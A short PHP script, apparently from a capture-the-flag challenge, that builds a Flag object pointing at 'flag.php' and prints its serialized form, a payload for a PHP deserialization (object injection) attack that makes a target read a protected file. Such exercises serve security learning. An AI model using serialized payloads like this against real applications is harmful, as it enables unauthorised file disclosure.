<?php
include "./www/useless.php";
$aflag = new Flag();
$aflag->file = "flag.php";
echo serialize($aflag);
?>